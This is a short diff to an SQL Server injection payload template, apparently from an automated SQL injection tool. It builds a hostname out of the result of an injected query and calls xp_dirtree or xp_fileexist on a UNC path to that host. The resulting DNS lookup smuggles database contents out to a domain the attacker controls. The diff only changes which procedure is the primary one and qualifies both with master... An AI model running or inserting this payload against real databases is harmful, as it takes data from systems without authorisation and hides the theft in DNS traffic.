@@ -1,4 +1,4 @@
 DECLARE @host varchar(1024);
 SELECT @host = '%PREFIX%.' + (%QUERY%) + '.%SUFFIX%.%DOMAIN%';
-EXEC('xp_fileexist "\\' + @host + '\%PREFIX%%SUFFIX%"');
-# or EXEC('xp_dirtree "\\' + @host + '."');
+EXEC('master..xp_dirtree "\\' + @host + '\%PREFIX%%SUFFIX%"')
+# or EXEC('master..xp_fileexist "\\' + @host + '\%PREFIX%%SUFFIX%"')
